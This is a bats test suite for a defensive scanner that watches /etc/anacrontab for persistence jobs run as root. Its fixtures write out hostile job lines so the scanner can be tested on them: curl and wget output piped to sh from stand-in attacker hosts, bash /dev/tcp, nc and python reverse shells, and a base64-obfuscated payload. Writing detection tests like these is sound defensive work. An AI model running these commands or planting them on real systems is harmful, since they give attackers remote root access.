#!/usr/bin/env bats
# L2 bats functional tests for the anacrontab-watchdog scan script.
#
# /etc/anacrontab runs `period delay job-id command…` entries AS ROOT when
# the machine has been off past the period — a scheduler-persistence vector
# cron-job-watchdog does not see. A job command under a writable root,
# relative-with-slash, or an injection pattern anywhere in the file is alert;
# bare commands (run-parts, nice) are normal.
#
# Runs the actual scan script with `logger` shadowed on PATH and the
# anacrontab in a tmp sandbox via SELFDEF_ANACRON_FILE.
#
# Run with: bats packaging/test/L2-anacrontab-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/anacrontab-watchdog/systemd/anacrontab-watchdog.sh"
# SDD-063: scan script now sources the shared module-lib.
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    ANAC="${TMP}/anacrontab"
    BENIGN='SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
1	5	cron.daily	run-parts --report /etc/cron.daily
7	25	cron.weekly	run-parts --report /etc/cron.weekly
'
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_ANACRON_PROFILE="${PROFILE:-report}" \
    SELFDEF_ANACRON_BASELINE="${BASELINE}" \
    SELFDEF_ANACRON_FILE="${ANAC_F:-$ANAC}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no anacrontab → ok / no_anacrontab" {
    ANAC_F="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_anacrontab"'
    cap | grep -q '"severity":"ok"'
}

@test "benign anacrontab, first run → ok / baseline_initial" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged anacrontab on second run → ok / anacrontab_intact" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"anacrontab_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "a job command under a writable root → alert / anacrontab_suspicious" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd                                   # benign baseline
    printf '%s1\t5\tevil.job\t/tmp/.x\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"anacrontab_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a job line carrying a curl|sh injection → alert" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tevil.job\t/bin/sh -c "curl http://evil|sh"\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a relative-with-slash job command → alert" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tevil.job\t./rel/x\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign job added → warn / anacrontab_changed" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s30\t45\tcron.monthly\trun-parts --report /etc/cron.monthly\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"anacrontab_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "standard run-parts jobs are NOT flagged" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile + SDD-063 fail-loud
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious job" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tevil.job\t/tmp/.x\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — anacrontab inventory enumerates delayed root-exec surface)" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in job → alert" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tshell.job\tbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in job → alert" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\twget.job\twget -qO- http://attacker/p | sh\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in job → alert" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tobfusc.job\techo YmFzaCAtaQ== | base64 -d | bash\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable anacrontab file): file itself world-writable → alert" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    chmod 0666 "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (job under /var/tmp writable root): expands writable-root coverage" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tevil.job\t/var/tmp/.payload\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (job under /dev/shm writable root): tmpfs payload → alert" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tevil.job\t/dev/shm/.payload\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-anacrontab -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): anacrontab-watchdog does NOT refresh baseline on suspicious-job detection — alert STAYS until operator updates" {
    # Delayed-root-exec persistence — suspicious-job alert MUST persist
    # across runs until operator explicitly re-baselines.
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tevil.job\t/tmp/.x\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"anacrontab_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented suspicious job NOT flagged: # prefix filtered)" {
    # anacrontab uses # for comments. Operator notes about hypothetical
    # attack patterns must NOT trigger alert.
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '%s# 1\t5\tevil.example\t/tmp/example-attacker\n' "${BENIGN}" > "${ANAC}"
    run_wd
    ! cap | grep -q '"event":"anacrontab_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '%s1\t5\tevil.job\tcurl -s http://attacker.com/p | bash\n' "${BENIGN}" > "${ANAC}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in anacrontab job: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # dhclient-hooks/bash-completion nc reverse-shell variant
    # INVARIANTs across the brain. Lock the netcat axis on
    # delayed-root-exec persistence surface too.
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '%s1\t5\tnc.job\tnc -e /bin/sh 1.1.1.1 4444\n' "${BENIGN}" > "${ANAC}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (multi-job: 3 dangerous jobs in one anacrontab → single consolidated alert; aggregation discipline)" {
    # Sister to many other watchdog multi-item-single-alert
    # consolidation INVARIANTs across the brain. When an attacker
    # plants multiple dangerous jobs in one anacrontab edit, the
    # watchdog must consolidate into a SINGLE alert JSON record
    # (not 3 separate alerts that would flood the operator
    # dashboard). Locks the consolidation discipline alongside
    # the SDD-062 single-line consumer contract.
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    cat > "${ANAC}" <<EOF
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
1	5	evil1	/tmp/.payload1
1	5	evil2	/var/tmp/.payload2
1	5	evil3	curl http://evil/x | sh
EOF
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
    main_count=$(cap | grep -cE '^-t selfdef-anacrontab -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on anacrontab job surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the anacron-
    # schedule-trigger root-exec persistence surface (T1053.003
    # — anacron runs jobs AS ROOT periodically; the period
    # parameter makes the trigger durable across reboots).
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    cat > "${ANAC}" <<'EOF'
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
1	5	evil	python -c "import socket,os,pty;s=socket.socket();s.connect(('1.1.1.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn('/bin/sh')"
EOF
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}
